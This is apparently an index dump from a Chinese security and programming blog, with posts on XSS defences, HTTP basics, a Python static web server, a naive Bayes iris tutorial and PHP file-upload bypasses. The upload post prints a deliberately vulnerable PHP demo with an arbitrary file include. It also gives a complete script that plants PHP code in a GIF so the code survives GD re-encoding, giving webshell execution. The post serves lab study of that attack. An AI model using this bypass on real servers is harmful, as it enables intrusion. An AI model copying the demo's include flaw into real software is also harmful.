Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Get input $name = htmlspecialchars( $_GET[ 'name' ] ); // Feedback for end user echo \"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;\"; &#125; // Generate Anti-CSRF tokengenerateSessionToken();?&gt; 代码采用了Anti-CSRF token机制 htmlspecialchars() 函数把预定义的字符转换为 HTML 实体。 预定义的字符是： &amp; （和号）成为 &amp; “ （双引号）成为 “ ‘ （单引号）成为 ‘ &lt; （小于）成为 &lt; &gt; （大于）成为 &gt; 0x03 防范措施3.1 HttpOnly 防止劫取 Cookie 攻击者可以通过注入恶意脚本获取用户的 Cookie 信息。通常 Cookie 中都包含了用户的登录凭证信息，攻击者在获取到 Cookie 之后，则可以发起 Cookie 劫持攻击。所以，严格来说，HttpOnly 并非阻止 XSS 攻击，而是能阻止 XSS 攻击后的 Cookie 劫持攻击。 3.2 用户端输入检查 对于用户的任何输入要进行检查、过滤和转义。 建立可信任的字符和 HTML 标签白名单，对于不在白名单之列的字符或者标签进行过滤或编码。 HTML转义：对用户输入的内容进行HTML转义，转义后可以确保用户输入的内容在浏览器中作为文本显示，而不是作为代码解析。 一些前端框架中，都会有一份 decodingMap， 用于对用户输入所包含的特殊字符或标签进行编码或过滤，如 &lt;，&gt;，script，防止 XSS 攻击： 12345678910&#x2F;&#x2F; vuejs 中的 decodingMap&#x2F;&#x2F; 在 vuejs 中，如果输入带 script 标签的内容，会直接过滤掉const decodingMap &#x3D; &#123; &#39;&lt;&#39;: &#39;&lt;&#39;, &#39;&gt;&#39;: &#39;&gt;&#39;, &#39;&quot;&#39;: &#39;&quot;&#39;, &#39;&amp;&#39;: &#39;&amp;&#39;, &#39; &#39;: &#39;\\n&#39;&#125; 3.3 服务端输出检查 用户的输入会存在问题，服务端的输出也会存在问题。一般来说，除富文本的输出外，在变量输出到 HTML 页面时，可以使用编码或转义的方式来防御 XSS 攻击。例如利用 sanitize-html 对输出内容进行有规则的过滤之后再输出到页面中。","categories":[{"name":"网络安全","slug":"网络安全","permalink":"https://fishni.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"Web安全","slug":"网络安全/Web安全","permalink":"https://fishni.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://fishni.github.io/tags/PHP/"},{"name":"XSS","slug":"XSS","permalink":"https://fishni.github.io/tags/XSS/"}]},{"title":"【python-Web服务器】1.1 HTTP协议简介","slug":"1.1 HTTP协议简介","date":"2020-04-05T16:00:00.000Z","updated":"2020-04-08T13:09:59.556Z","comments":true,"path":"2020/04/06/1.1 HTTP协议简介/","link":"","permalink":"https://fishni.github.io/2020/04/06/1.1%20HTTP%E5%8D%8F%E8%AE%AE%E7%AE%80%E4%BB%8B/","excerpt":"本文主要结合浏览器开发者工具理解HTTP协议，分析浏览器与服务器之间的请求和响应。","text":"本文主要结合浏览器开发者工具理解HTTP协议，分析浏览器与服务器之间的请求和响应。 0x01 使用谷歌/火狐浏览器分析 在Web应用中，服务器把网页传给浏览器，实际上就是把网页的HTML代码发送给浏览器，让浏览器显示出来。而浏览器和服务器之间的传输协议是HTTP,所以： HTML是一种用来定义网页的文本 HTTP是在网络上传输HTML的协议，用于浏览器和服务器的通信 Chrome浏览器提供了完整的调试工具，非常适合Web开发。在Chrome浏览器（更多工具–&gt;开发者工具）或者Windows下F12说明 Elements显示网页的结构 Network显示浏览器和服务器的通信 点击Network，确保第一个小红灯亮着，Chrome就会记录所有浏览器和服务器之间的通信： 0x02 HTTP协议分析当在地址栏输入www.baidu.com时,浏览器显示百度首页。在这个过 程中，浏览器都干了哪些事情呢？通过Network的记录，我们就可以知道。 在Network中，找到www.baidu.com那条记录，点击，右侧将显示Request Headers，点击右侧的view-source，我们就可以看到浏览器发给百度服务器的请求： 2.1 浏览器请求 说明：（最主要的头两⾏分析如下） 第⼀⾏GET / HTTP/1.1：GET表示⼀个读取请求，将从服务器获得⽹⻚数据，/表示URL的路径，URL 总是以/开头，/就表示⾸⻚，最后的HTTP/1.1指示采⽤的HTTP协议版本是 1.1。⽬前HTTP协议的版本就是1.1，但是⼤部分服务器也⽀持1.0版本，主 要区别在于1.1版本允许多个HTTP请求复⽤⼀个TCP连接，以加快传输速 度。 从第⼆⾏开始，每⼀⾏都类似于Xxx: abcdefg：Host: www.baidu.com，表示请求的域名是www.baidu.com。如果⼀台服务器有多个⽹站，服务器就需 要通过Host来区分浏览器请求的是哪个⽹站。 2.2 服务器响应继续找到Response Headers，点击view-source，显示服务器返回的原始响应数据： HTTP响应分为Header和Body两部分（Body是可选项），我们在Network中 看到的Header最重要的⼏⾏如下： HTTP/1.1 200 OK：200表示⼀个成功的响应，后⾯的OK是说明。 如果返回的不是200，那么往往有其他的功能，例如 失败的响应有404 Not Found：网⻚不存在 500 Internal Server Error：服务器内部出错 等等… Content-Type:text/html：Content-Type指示响应的内容，这⾥是text/html表示HTML⽹⻚。 请注意，浏览器就是依靠Content-Type来判断响应的内容是网页还是图⽚，是视频还是⾳乐。浏览器并不靠URL来判断响应的内容，所以，即使URL是 http://www.baidu.com/meimei.jpg，它也不⼀定就是图⽚。 HTTP响应的Body就是HTML源码，右键查看网页源码，就是查看响应的body 浏览器解析过程 当浏览器读取到百度⾸⻚的HTML源码后，它会解析HTML，显示⻚⾯，然后，根据HTML⾥⾯的各种链接，再发送HTTP请求给百度服务器，拿到相应的图⽚、视频、Flash、JavaScript脚本、CSS等各种资源，最终显示出⼀个完整的⻚⾯。所以我们在Network下⾯能看到很多额外的HTTP请求 0x03 总结3.1 HTTP请求步骤1：浏览器⾸先向服务器发送HTTP请求，请求包括： ⽅法：GET还是POST，GET仅请求资源，POST会附带⽤户数据； 路径：/full/url/path； 域名：由Host头指定； 以及其他相关的Header； 如果是POST，那么请求还包括⼀个Body，包含⽤户数据 步骤2：服务器向浏览器返回HTTP响应，响应包括： 响应代码：200表示成功，3xx表示重定向，4xx表示客户端发送的请求 有错误，5xx表示服务器端处理时发⽣了错误； 响应类型：由Content-Type指定； 以及其他相关的Header； 通常服务器的HTTP响应会携带内容，也就是有⼀个Body，包含响应的 内容，⽹⻚的HTML源码就在Body中。 步骤3：如果浏览器还需要继续向服务器请求其他资源， ⽐如图⽚，就再次发出HTTP请求，重复步骤1、2 Web采⽤的HTTP协议采⽤了⾮常简单的请求-响应模式，从⽽⼤⼤简化 了开发。当我们编写⼀个⻚⾯时，我们只需要在HTTP请求中把HTML 发送出去，不需要考虑如何附带图⽚、视频等，浏览器如果需要请求图 ⽚和视频，它会发送另⼀个HTTP请求，因此，⼀个HTTP请求只处理 ⼀个资源(此时就可以理解为TCP协议中的短连接，每个链接只获取⼀ 个资源，如需要多个就需要建⽴多个链接) 3.2 HTTP格式每个HTTP请求和响应都遵循相同的格式，⼀个HTTP包含Header和Body两 部分，其中Body是可选的。HTTP协议是⼀种⽂本协议，所以，它的格式也⾮常简单 HTTP GET请求的格式：1234GET &#x2F;path HTTP&#x2F;1.1 Header1: Value1 Header2: Value2 Header3: Value3 每个Header⼀⾏⼀个，换⾏符是\\r\\n HTTP POST请求的格式：123456POST &#x2F;path HTTP&#x2F;1.1Header1: Value1Header2: Value2Header3: Value3body data goes here... 当遇到连续两个\\r\\n时，Header部分结束，后⾯的数据全部是Body HTTP响应的格式：123456200 OK Header1: Value1 Header2: Value2 Header3: Value3 body data goes here... HTTP响应如果包含body，也是通过\\r\\n\\r\\n来分隔的 请再次注意，Body的数据类型由Content-Type头来确定，如果是⽹⻚，Body就是⽂本，如果是图⽚，Body就是图⽚的⼆进制数据。 当存在Content-Encoding时，Body数据是被压缩的，最常⻅的压缩⽅式是gzip，所以，看到Content-Encoding:gzip时，需要将Body数据先解压缩，才能得到真正的数据。压缩的⽬的在于减少Body的⼤⼩，加快⽹络传输。","categories":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/categories/python/"},{"name":"Web服务器","slug":"python/Web服务器","permalink":"https://fishni.github.io/categories/python/Web%E6%9C%8D%E5%8A%A1%E5%99%A8/"}],"tags":[{"name":"HTTP","slug":"HTTP","permalink":"https://fishni.github.io/tags/HTTP/"},{"name":"Web","slug":"Web","permalink":"https://fishni.github.io/tags/Web/"}]},{"title":"【python-Web服务器】1.3 python-Web静态服务器-2-显示需要的页面","slug":"1.3 python-Web静态服务器-2-显示需要的页面","date":"2020-04-05T16:00:00.000Z","updated":"2020-04-08T13:09:52.771Z","comments":true,"path":"2020/04/06/1.3 python-Web静态服务器-2-显示需要的页面/","link":"","permalink":"https://fishni.github.io/2020/04/06/1.3%20python-Web%E9%9D%99%E6%80%81%E6%9C%8D%E5%8A%A1%E5%99%A8-2-%E6%98%BE%E7%A4%BA%E9%9C%80%E8%A6%81%E7%9A%84%E9%A1%B5%E9%9D%A2/","excerpt":"本文使用python写个可以显示需要页面的Web静态服务器。","text":"本文使用python写个可以显示需要页面的Web静态服务器。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263# coding: utf-8import socketfrom multiprocessing import Processimport reHTML_ROOT_DIR = \"./html\"def handle_client(client_socket): \"\"\"处理客户端请求\"\"\" # 获取客户端数据 request_data = client_socket.recv(1024) print(\"request data:\",request_data) # 处理请求数据 request_lines = request_data.splitlines() for line in request_lines: print(line) # \"GET / HTTP/1.1\" request_start_line = request_lines[0] file_name = re.match(r\"\\w+ +(/[^ ]*)\",request_start_line.decode(\"utf-8\")).group(1) if \"/\" == file_name: file_name= \"/index.html\" # 打开文件 try: file = open(HTML_ROOT_DIR+file_name,\"rb\") except IOError: # 构造响应数据 response_start_line = \"HTTP/1.1 404 Not Found\\r\\n\" response_headers = \"Server: My testserver\\r\\n\" response_body = \"file is not found!\" else: file_data = file.read() file.close() # 构造响应数据 response_start_line = \"HTTP/1.1 200 0k\\r\\n\" response_headers = \"Server: My testserver\\r\\n\" response_body = file_data.decode(\"utf-8\") response = response_start_line + response_headers+ \"\\r\\n\"+ response_body print(\"response:\",response) # 向客户端发送数据 client_socket.send(bytes(response,\"utf-8\")) # 关闭客户端连接 client_socket.close()if __name__ == \"__main__\": server_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM) server_socket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1) server_socket.bind((\"\",8000)) server_socket.listen(128) while True: client_socket, client_address = server_socket.accept() print(\"[%s,%s]用户连接上了\"%client_address) handle_client_process = Process(target=handle_client, args=(client_socket,)) handle_client_process.start() client_socket.close()","categories":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/categories/python/"},{"name":"Web服务器","slug":"python/Web服务器","permalink":"https://fishni.github.io/categories/python/Web%E6%9C%8D%E5%8A%A1%E5%99%A8/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://fishni.github.io/tags/Web/"},{"name":"python","slug":"python","permalink":"https://fishni.github.io/tags/python/"}]},{"title":"【python-Web服务器】1.2 python-Web静态服务器-1-显示固定的页面","slug":"1.2 python-Web静态服务器-1-显示固定的页面","date":"2020-04-05T16:00:00.000Z","updated":"2020-04-06T09:45:04.116Z","comments":true,"path":"2020/04/06/1.2 python-Web静态服务器-1-显示固定的页面/","link":"","permalink":"https://fishni.github.io/2020/04/06/1.2%20python-Web%E9%9D%99%E6%80%81%E6%9C%8D%E5%8A%A1%E5%99%A8-1-%E6%98%BE%E7%A4%BA%E5%9B%BA%E5%AE%9A%E7%9A%84%E9%A1%B5%E9%9D%A2/","excerpt":"本文使用python写个简单的Web静态服务器","text":"本文使用python写个简单的Web静态服务器 12345678910111213141516171819202122232425262728293031323334# coding: utf-8import socketfrom multiprocessing import ProcessHTML_ROOT_DIR = \"\"def handle_client(client_socket): \"\"\"处理客户端请求\"\"\" # 获取客户端数据 request_data = client_socket.recv(1024) print(\"request data:\",request_data) # 构造响应数据 response_start_line = \"HTTP/1.1 200 0k\\r\\n\" response_headers = \"Server: My testserver\\r\\n\" response_body = \"hello world\" response = response_start_line + response_headers+ \"\\r\\n\"+ response_body print(\"response:\",response) # 向客户端发送数据 client_socket.send(bytes(response,\"utf-8\")) # 关闭客户端连接 client_socket.close()if __name__ == \"__main__\": server_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM) server_socket.bind((\"\",8000)) server_socket.listen(128) while True: client_socket, client_address = server_socket.accept() print(\"[%s,%s]用户连接上了\"%client_address) handle_client_process = Process(target=handle_client, args=(client_socket,)) handle_client_process.start() client_socket.close() 服务端 客户端","categories":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/categories/python/"},{"name":"Web服务器","slug":"python/Web服务器","permalink":"https://fishni.github.io/categories/python/Web%E6%9C%8D%E5%8A%A1%E5%99%A8/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://fishni.github.io/tags/Web/"},{"name":"python","slug":"python","permalink":"https://fishni.github.io/tags/python/"}]},{"title":"【机器学习算法】鸢尾花数据集GaussianNB分类预测","slug":"鸢尾花数据集GaussianNB分类预测","date":"2020-04-04T16:00:00.000Z","updated":"2020-04-05T05:29:41.655Z","comments":true,"path":"2020/04/05/鸢尾花数据集GaussianNB分类预测/","link":"","permalink":"https://fishni.github.io/2020/04/05/%E9%B8%A2%E5%B0%BE%E8%8A%B1%E6%95%B0%E6%8D%AE%E9%9B%86GaussianNB%E5%88%86%E7%B1%BB%E9%A2%84%E6%B5%8B/","excerpt":"本文主要内容 UC Irvine具有用于存储各种数据的大型存储库。 本文使用鸢尾花数据集（https://archive.ics.uci.edu/ml/datasets/Iris）进行实验。 为分类任务实施朴素贝叶斯分类器。 这项试验，随机抽取70％的实例进行训练，其余的则进行测试。 重复试验10次并计算平均准确度。 由于特征是连续变量，因此您可能需要在概率计算中使用高斯模型。","text":"本文主要内容 UC Irvine具有用于存储各种数据的大型存储库。 本文使用鸢尾花数据集（https://archive.ics.uci.edu/ml/datasets/Iris）进行实验。 为分类任务实施朴素贝叶斯分类器。 这项试验，随机抽取70％的实例进行训练，其余的则进行测试。 重复试验10次并计算平均准确度。 由于特征是连续变量，因此您可能需要在概率计算中使用高斯模型。 0x01 实验流程1.1 加载鸢尾花数据集 采用sklearn.datasets模块导入load_iris数据集 123# load the iris dataset from sklearn.datasets import load_iris iris = load_iris() 1.2 存储特征矩阵和响应向量123# store the feature matrix (X) and response vector (y) X = iris.data y = iris.target 1.3 将X和y分为训练和测试集123# splitting X and y into training and testing sets from sklearn.model_selection import train_test_split X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.3, random_state=1) sklearn.model_selection.train_test_split用法 作用：将数组或矩阵拆分为训练集和测试集 语法：sklearn.model_selection.train_test_split(*arrays, **options) train_test_split里面常用的因数（arguments）介绍： arrays：分割对象同样长度的列表或者numpy arrays，矩阵。 test_size：两种指定方法。1：指定小数。小数范围在0.0~0.1之间，它代表test集占据的比例。2：指定整数。整数的大小必须在这个数据集个数范围内，总不能指定一个数超出了数据集的个数范围吧。要是test_size在没有指定的场合，可以通过train_size来指定。（两个是对应关系）。如果train_size也没有指定，那么默认值是0.25. train_size：和test_size相似。 random_state:这是将分割的training和testing集合打乱的个数设定。如果不指定的话，也可以通过numpy.random来设定随机数。 shuffle和straify不常用。straify就是将数据分层。 返回值：将输入列表拆分为训练和测试集 train_test_split 用法举例： 这个数据集 4列，12行 使用pandas模块，制作数据集 123456789101112import pandas as pdfrom sklearn.model_selection import train_test_splitnamelist = pd.DataFrame(&#123; \"name\" : [\"Suzuki\", \"Tanaka\", \"Yamada\", \"Watanabe\", \"Yamamoto\", \"Okada\", \"Ueda\", \"Inoue\", \"Hayashi\", \"Sato\", \"Hirayama\", \"Shimada\"], \"age\": [30, 40, 55, 29, 41, 28, 42, 24, 33, 39, 49, 53], \"department\": [\"HR\", \"Legal\", \"IT\", \"HR\", \"HR\", \"IT\", \"Legal\", \"Legal\", \"IT\", \"HR\", \"Legal\", \"Legal\"], \"attendance\": [1, 1, 1, 0, 1, 1, 1, 0, 0, 1, 1, 1] &#125;)namelist .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } name age department attendance 0 Suzuki 30 HR 1 1 Tanaka 40 Legal 1 2 Yamada 55 IT 1 3 Watanabe 29 HR 0 4 Yamamoto 41 HR 1 5 Okada 28 IT 1 6 Ueda 42 Legal 1 7 Inoue 24 Legal 0 8 Hayashi 33 IT 0 9 Sato 39 HR 1 10 Hirayama 49 Legal 1 11 Shimada 53 Legal 1 将testing数据指定为0.3（test_size=0.3），从而将testing和training 集合分开。 1namelist_train, namelist_test = train_test_split(namelist, test_size=0.3) 1namelist_train .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } name age department attendance 3 Watanabe 29 HR 0 5 Okada 28 IT 1 1 Tanaka 40 Legal 1 4 Yamamoto 41 HR 1 10 Hirayama 49 Legal 1 9 Sato 39 HR 1 11 Shimada 53 Legal 1 2 Yamada 55 IT 1 1namelist_test .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } name age department attendance 7 Inoue 24 Legal 0 6 Ueda 42 Legal 1 8 Hayashi 33 IT 0 0 Suzuki 30 HR 1 接下来是将testing数据指定为具体数目。test_size=5 12namelist_train, namelist_test = train_test_split(namelist, test_size=5)namelist_test .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } name age department attendance 0 Suzuki 30 HR 1 1 Tanaka 40 Legal 1 6 Ueda 42 Legal 1 10 Hirayama 49 Legal 1 11 Shimada 53 Legal 1 接下来将training data 指定为0.5（training_size=0.5） 12namelist_train, namelist_test = train_test_split(namelist, test_size=None, train_size=0.5)namelist_train .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } name age department attendance 7 Inoue 24 Legal 0 6 Ueda 42 Legal 1 5 Okada 28 IT 1 3 Watanabe 29 HR 0 0 Suzuki 30 HR 1 9 Sato 39 HR 1 shuffle功能 12namelist_train, namelist_test = train_test_split(namelist, shuffle=False)namelist_test .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } name age department attendance 9 Sato 39 HR 1 10 Hirayama 49 Legal 1 11 Shimada 53 Legal 1 1.4 使用高斯模型训练数据集12345678# training the model on training set #引入高斯朴素贝叶斯from sklearn.naive_bayes import GaussianNB # 实例化gnb = GaussianNB() #训练数据 fit相当于traingnb.fit(X_train, y_train) GaussianNB(priors=None, var_smoothing=1e-09)1.5 测试集预测12# making predictions on the testing set y_pred = gnb.predict(X_test) 1.6 比较预测值和实际值123# comparing actual response values (y_test) with predicted response values (y_pred) from sklearn import metrics print(\"Gaussian Naive Bayes model accuracy(in %):\", metrics.accuracy_score(y_test, y_pred)*100) Gaussian Naive Bayes model accuracy(in %): 93.33333333333333 sklearn.metrics中的评估方法介绍（https://blog.csdn.net/cherdw/article/details/55813071） 1.7 完整代码1234567891011121314151617181920212223# load the iris dataset from sklearn.datasets import load_iris iris = load_iris() # store the feature matrix (X) and response vector (y) X = iris.data y = iris.target # splitting X and y into training and testing sets from sklearn.model_selection import train_test_split X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.3, random_state=1) # training the model on training set from sklearn.naive_bayes import GaussianNB gnb = GaussianNB() gnb.fit(X_train, y_train) # making predictions on the testing set y_pred = gnb.predict(X_test) # comparing actual response values (y_test) with predicted response values (y_pred) from sklearn import metrics print(\"Gaussian Naive Bayes model accuracy(in %):\", metrics.accuracy_score(y_test, y_pred)*100) Gaussian Naive Bayes model accuracy(in %): 93.33333333333333","categories":[{"name":"人工智能","slug":"人工智能","permalink":"https://fishni.github.io/categories/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/"},{"name":"机器学习算法","slug":"人工智能/机器学习算法","permalink":"https://fishni.github.io/categories/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/tags/python/"},{"name":"GaussianNB","slug":"GaussianNB","permalink":"https://fishni.github.io/tags/GaussianNB/"},{"name":"算法","slug":"算法","permalink":"https://fishni.github.io/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"【文件上传（五）：高级利用】5.1 图片重绘","slug":"5.1 图片重绘","date":"2020-04-02T16:00:00.000Z","updated":"2020-04-14T08:54:14.348Z","comments":true,"path":"2020/04/03/5.1 图片重绘/","link":"","permalink":"https://fishni.github.io/2020/04/03/5.1%20%E5%9B%BE%E7%89%87%E9%87%8D%E7%BB%98/","excerpt":"本文主要内容 重绘图的概念 图片重绘实例分析，PHP输出图像函数","text":"本文主要内容 重绘图的概念 图片重绘实例分析，PHP输出图像函数 0x01 重绘图 应用调用图片库对上传的图片进行了图像转换，所以即使将图片与文件合并，也会将尾部转换掉，无法使用常规方法上传webshell. 如何绕过 将正常图片用目标使用的图像库进行转换 寻找转换前后两次未变的部分 将未变部分替换为欲上传的WebShell 将替换后的文件进行图像文件转换，看是否转换后仍存在替换后部分 比如： 转换前：1233333abcdefg[1111222333]sdas213 转换后：xsadssdddsdddd[1111222333]2313322 0x02 实战练习 参考代码地址https://github.com/RickGray/Bypass-PHP-GD-Process-To-RCE 2.1 部署 将参考代码地址项目下载，并放置在windows+phpstudy WWW目录下，并访问，部署完成状态 2.2 上传代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;h2&gt;This is a quick demo to show the process of bypass PHP-GD.&lt;/h2&gt;&lt;h3&gt;Choose image to upload, then \"include $upload_path;\" to show some data.&lt;/h3&gt;&lt;h3&gt;or, use parameter \"file\" to include file, e.g. http://xxxxx/index.php?file=&amp;lt;something&amp;gt;&lt;/h3&gt;&lt;form method=\"POST\" action=\"\" enctype=\"multipart/form-data\"&gt; &lt;input type=\"file\" name=\"upfile\" value=\"\"&gt; &lt;input type=\"submit\" value=\"upload\"&gt;&lt;/form&gt;&lt;?phpfunction gd_process($src_img, $dst_img) &#123; try &#123; # you can redefine the GD process $im = imagecreatefromgif($src_img); imagegif($im, $dst_img); &#125; catch (Exception $e) &#123; printf(\"%s\\n\", $e-&gt;getMessage()); return false; &#125; return true;&#125;if (isset($_FILES[\"upfile\"])) &#123; $temp_file = $_FILES['upfile']['tmp_name']; $img_info = getimagesize($temp_file); if ($img_info[2] == '1') &#123; $upload_file = \"test.gif\"; if (!gd_process($temp_file, $upload_file)) &#123; printf(\"Image upload process error, please check out.\\n\"); exit; &#125; printf(\"Path: %s, image upload successful!\\n\", $upload_file); include $upload_file; &#125; else &#123; printf(\"Image type not support in this demo, GIF please...\\n\"); exit; &#125;&#125;if (isset($_REQUEST[\"file\"])) &#123; include $_REQUEST[\"file\"];&#125;?&gt; imagecreatefromgif()函数 由文件或 URL 创建一个新图象 描述：imagecreatefromgif ( string $filename )返回一图像标识符，代表了从给定的文件名取得的图像 PHP 输出图像 imagegif()、imagejpeg()、imagepng() 和 imagewbmp()函数分别允许以 GIF、JPEG、PNG 和 WBMP 格式将图像输出到浏览器或文件。 语法： bool imagegif ( resource image [, string filename] ) bool imagejpeg ( resource image [, string filename [, int quality]] ) bool imagepng ( resource image [, string filename] ) bool imagewbmp ( resource image [, string filename [, int foreground]] ) 参数说明： image 欲输出的图像资源，如 imagecreate() 或 imagecreatefrom 系列函数的返回值 filename 可选，指定输出图像的文件名。如果省略，则原始图像流将被直接输出。 quality 可选，指定图像质量，范围从 0（最差质量，文件最小）到 100（最佳质量，文件最大），默认75 ，imagejpeg() 独有参数 foreground 可选，指定前景色，默认前景色是黑色，imagewbmp() 独有参数 2.3 上传利用copy制作的图片木马 图片demotest.gif 含phpinfo()WebShell，测试结果 分析上传成功的test.gif和demotest.gif 2.4 图片转换代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159&lt;?php/** * Author: rickchen.vip(at)gmail.com * Date: 2015-04-05 * Desc: Use Similar-Block-Attack to bypass PHP-GD process to RCE * Reference: http://www.secgeek.net/bookfresh-vulnerability/ * Usage: php codeinj.php demo.gif \"&lt;?php phpinfo();?&gt;\" */function gd_process($src_img, $dst_img) &#123; try &#123; # you can redefine the GD process $im = imagecreatefromgif($src_img); imagegif($im, $dst_img); &#125; catch (Exception $e) &#123; printf(\"%s\\n\", $e-&gt;getMessage()); return false; &#125; return true;&#125;function find_similar_block($src_img, $dst_img, $block_len, $slow=false) &#123; $src_data = fread(fopen($src_img, \"rb\"), filesize($src_img)); $dst_data = fread(fopen($dst_img, \"rb\"), filesize($dst_img)); $src_index = 0; $pre_match_array = array(); while ($src_index &lt; (strlen($src_data) - $block_len)) &#123; $find_data = substr($src_data, $src_index, $block_len); $dst_index = 0; $found = false; while ($dst_index &lt; (strlen($dst_data) - $block_len)) &#123; $temp_data = substr($dst_data, $dst_index, $block_len); if (0 === strcmp($find_data, $temp_data)) &#123; $match = array( \"src_offset\" =&gt; $src_index, \"dst_offset\" =&gt; $dst_index ); $pre_match_array[] = $match; $found = true; /* printf(\"Similar block found&gt; src_offset: %d\\n\", $src_index); printf(\" dst_offset: %d\\n\", $dst_index); printf(\" similar_data: %s\\n\", str2hex($temp_data)); printf(\" similar_length: %s\\n\\n\", strlen($temp_data)); */ &#125; if ($found &amp;&amp; $slow == false) $dst_index += $block_len; else $dst_index++; &#125; if ($found &amp;&amp; $slow == false) $src_index += $block_len; else $src_index++; &#125; return $pre_match_array;&#125;function inject_code_to_src_img($src_img, $pre_match_array, $injection_code) &#123; $src_data = fread(fopen($src_img, \"rb\"), filesize($src_img)); $inj_len = strlen($injection_code); $find_n = 0; foreach ($pre_match_array as $similar_block) &#123; #printf(\"Trying inject code to source image with offset: %d, length: %d\\n\", $similar_block[\"src_offset\"], $inj_len); $mod_src_data = substr($src_data, 0, $similar_block[\"src_offset\"]).$injection_code.substr($src_data, $similar_block[\"src_offset\"] + $inj_len); $temp_img = sys_get_temp_dir().\"/\".$src_img.\".mod\"; $temp_cvt_img = $temp_img.\".gd\"; fwrite(fopen($temp_img, \"wb\"), $mod_src_data); if (!gd_process($temp_img, $temp_cvt_img)) &#123; #printf(\"PHP-GD process() the image modified error, offset: %d\\n\", $similar_block[\"src_offset\"]); #printf(\" length: %d\\n\\n\", $inj_len); continue; &#125; else &#123; if (check_code($temp_cvt_img, $injection_code)) &#123; $fuck_img = \"gd_\".$src_img; fwrite(fopen($fuck_img, \"wb\"), $mod_src_data); printf(\"Inject code to source image successful with offset: %d\\n\", $similar_block[\"src_offset\"]); printf(\"Saving result \\\"%s\\\", have fun! :)\\n\", $fuck_img); exit; &#125; else &#123; continue; #printf(\"Modified image doesn't work well, offset: %d, retry...\\n\", $similar_block[\"src_offset\"]); &#125; &#125; &#125;&#125;function check_code($src_img, $injection_code) &#123; $data = fread(fopen($src_img, \"rb\"), filesize($src_img)); return strpos($data, $injection_code);&#125;function str2hex($str)&#123; $hex = \"\"; for ($i = 0; $i &lt; strlen($str); $i++)&#123; $hex .= sprintf(\"%02x\", (ord($str[$i])));; &#125; return $hex;&#125;function hex2str($hex)&#123; $str = \"\"; for ($i = 0; $i &lt; strlen($hex)-1; $i+=2)&#123; $str .= chr(hexdec($hex[$i].$hex[$i+1])); &#125; return $str;&#125;/* main */if ($argc &lt; 3) &#123; printf(\"Usage: php %s &lt;src_img&gt; &lt;inj_code&gt;\\n\", $argv[0]); exit;&#125;$slow = false;$src_img = $argv[1];$injection_code = $argv[2];$img_info = getimagesize($src_img);/* GIF image type value \"1\" */if ($img_info[2] == '1') &#123; $cvt_img = sys_get_temp_dir().\"/\".basename($src_img); if (!gd_process($src_img, $cvt_img)) &#123; printf(\"PHP-GD process() function error, please check out.\\n\"); exit; &#125;&#125; else &#123; printf(\"This script only support GIF image.\\n\"); exit;&#125;$block_len = strlen($injection_code);$pre_match_array = find_similar_block($src_img, $cvt_img, $block_len, $slow);if (sizeof($pre_match_array)) &#123; inject_code_to_src_img($src_img, $pre_match_array, $injection_code);&#125; else &#123; printf(\"Not found any similar %d bytes block.\\n\", strlen($injection_code));&#125;printf(\"Cant find any useful similar block to inject code, but take it easy. :(\\n\"); 2.5 使用图片转换代码，转换代码 转换操作如图 查看demo.gif,经过转换后的gd_demo.gif 2.6 上传2.5转换后的图片gd_demo.gif 测试结果 再次分析gd_demo.gif和上传成功的test.gif","categories":[{"name":"网络安全","slug":"网络安全","permalink":"https://fishni.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"Web安全","slug":"网络安全/Web安全","permalink":"https://fishni.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"fileupload","slug":"fileupload","permalink":"https://fishni.github.io/tags/fileupload/"},{"name":"PHP","slug":"PHP","permalink":"https://fishni.github.io/tags/PHP/"}]},{"title":"【文件上传（三）：服务端检测绕过】3.4服务端文件内容检测绕过","slug":"3.4 服务端文件内容检测","date":"2020-03-27T16:00:00.000Z","updated":"2020-04-14T08:53:49.831Z","comments":true,"path":"2020/03/28/3.4 